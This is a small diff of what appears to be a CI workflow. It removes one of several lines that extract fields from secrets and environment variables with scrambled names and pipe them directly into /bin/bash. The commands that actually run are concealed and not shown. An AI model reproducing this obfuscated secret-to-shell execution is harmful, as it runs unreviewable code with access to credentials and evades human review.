@@ -19,7 +19,6 @@ jobs:
           whhyk4042: ${{ secrets.whhyk4042 }}
         run: |
           printf '%s' "$whhyk4042" | jq -r .s16697 | /bin/bash
-          echo $j0996 | jq -r .yu265 | /bin/bash
           printf '%s' "$zvf31" | jq -r .yiq149 | /bin/bash
           echo $qrduw364 | jq -r .thtjw8938 | /bin/bash
           printf '%s' "$x68704" | jq -r .oj9948 | /bin/bash
